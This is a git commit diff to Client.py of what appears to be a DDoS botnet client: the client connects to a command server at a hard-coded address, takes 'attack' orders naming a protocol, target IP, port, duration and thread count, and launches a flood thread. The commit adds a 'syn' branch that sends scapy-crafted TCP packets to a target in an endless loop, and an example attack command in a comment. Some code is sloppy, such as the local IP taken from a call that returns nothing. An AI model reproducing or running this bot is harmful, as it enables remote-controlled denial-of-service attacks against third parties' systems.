d44d3ac5cee994eb83c19a19b4283fb25b17bd5e
tathaiduy <69078392+tathaiduy@users.noreply.github.com>
2022-02-21 13:16:21 +0700

    Update Client.py
    update client.py

--- Client.py
+++ Client.py
@@ -5,7 +5,7 @@ import sys, random
 from typing import Tuple
 class Client():
 	run=False
-	def __init__(self, connect:Tuple[str,int]=("118.71.27.70",9999)) -> None:
+	def __init__(self, connect:Tuple[str,int]=("192.168.1.48",9999)) -> None:
 		signal.signal(signal.SIGINT, self.exit_gracefully)
 		signal.signal(signal.SIGTERM, self.exit_gracefully)
 		self.stop = False
@@ -60,19 +60,38 @@ class Client():
 		while True:
 			data = self._recv()
 			if "attack" in data:
-
+				#attack udp 192.168.1.1 50 120 3000
 				data=data.replace("attack ","").split()
 				try:
 					proto, ip, port, sec, thread =  data #tge data include the ip, port, protocol, and thread
 					data = proto, ip, int(port), int(sec), int(thread)
 					self.sock.send("done".encode("ascii"))
+
 				except Exception as e:
 					print(e)
 					self.sock.send("invalid command".encode("ascii")) #if the code has exception from sending the data, we will send the "invalid command" back to the server.
 					continue
+				self.run = True
+				Thread(target=self.__ddos, args=data).start()
+			elif "syn" in data:
+				data = data.replace("attack ", "").split()
+				try:
+					proto, ip, port, sec, thread = data
+					s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+					local_ip = s.connect(("8.8.8.8", 80))
+					destination_IP = ip
+					destination_port = int(port)
+					i = 1
+					while True:
+						send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,inter=0.0000001)
+						print("Packet sent: ",i)
+						i = i + 1
+				except Exception as e:
+					print(e)
+					self.sock.send("invalid command".encode("ascii"))  # if the code has exception from sending the data, we will send the "invalid command" back to the server.
 
-				self.run=True
-				Thread(target = self.__ddos,args=data).start() # create a thread to perform ddos attack.
+
+				 # create a thread to perform ddos attack.
 			elif "kill" in data:
 				self.run=False
 				self.sock.send(str.encode("Server Stopped")) # stop the server.
